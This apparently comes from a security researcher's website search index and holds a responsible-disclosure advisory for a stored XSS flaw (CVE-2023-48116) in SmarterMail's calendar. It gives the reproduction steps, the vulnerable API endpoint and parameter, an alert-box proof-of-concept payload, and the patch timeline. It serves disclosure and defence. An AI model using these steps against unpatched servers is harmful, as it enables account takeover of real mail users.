<p>Discovered by Coeus</p>"},{"location":"CVE/CVE-2023-48116/","title":"Stored XSS in Calendar component of SmarterMail (CVE-2023-48116)","text":""},{"location":"CVE/CVE-2023-48116/#summary","title":"Summary","text":"<p>A Stored XSS vulnerability exists in SmarterMail 16.x 8495 through 8664 within the application's calendar component due to inadequate input sanitization and filtering. Exploiting this flaw, an attacker can insert a malicious appointment into their calendar and subsequently share their calendar with a victim or a group of victims.</p> <p>Upon the victim accessing their calendar, they will view the attacker's calendar alongside the malicious appointment. Clicking on this malicious appointment triggers the execution of a script, compromising the victim's account. This critical vulnerability poses a severe risk, potentially resulting in the complete takeover of user accounts.</p> <p>In order to mitigate this vulnerability Install the latest application patch (Build 8747).</p>"},{"location":"CVE/CVE-2023-48116/#impact","title":"Impact","text":"<p>It is possible to take over a victim's account when they browse their calendar and click on a malicious appointment created by the attacker.</p>"},{"location":"CVE/CVE-2023-48116/#technical-details","title":"Technical Details","text":"<p>The vulnerability existed due to insufficient filtering and sanitization of the 'description' parameter. Below, I will outline the steps to reproduce this issue:</p> <ol> <li>Log in as the attacker and navigate to the calendar menu.</li> <li>Select your calendar name from the left menu, proceed to the <code>sharing</code> tab, and input the victim's username or select a user group (e.g., everyone). Save the changes.</li> <li>Create a new appointment, complete the form as desired. Ensure request interception is active, then click the <code>save</code> button</li> <li>When intercepting the request made to the <code>/api/v1/calendars/events/save/{username}/calendarId/null/true</code> endpoint, modify the value of the 'description' JSON parameter to include your malicious JavaScript payload.</li> </ol> <pre><code>&lt;img src=x onerror=alert(document.domain)&gt;\n</code></pre> <p></p> *Inserting Payload In Vulnerable Parameter* <ol> <li>Log in as the victim and navigate to your calendar. You will find the event created by the attacker. Click on the event, and an alert displaying the domain address should appear.</li> </ol>"},{"location":"CVE/CVE-2023-48116/#vendor-communication","title":"Vendor Communication","text":"<pre><code>07/11/2023: Issues were reported to the vendor\n29/11/2023: A BETA version was released \n05/12/2023: I tested the BETA version and confirmed issues were fixed\n13/12/2023: A patch (Build 8747) was released\n18/12/2023: Public disclosure\n</code></pre> <p>Discovered by Coeus</p>"},{"location":"Contact-Us/","title":"Contact Us","text":""},{"location":"Contact-Us/#contact-us","title":"Contact Us","text":"<p>How to reach us: </p>"},{"location":"Researches/","title":"Research","text":""},{"location":"Researches/#research","title":"Research","text":""}]}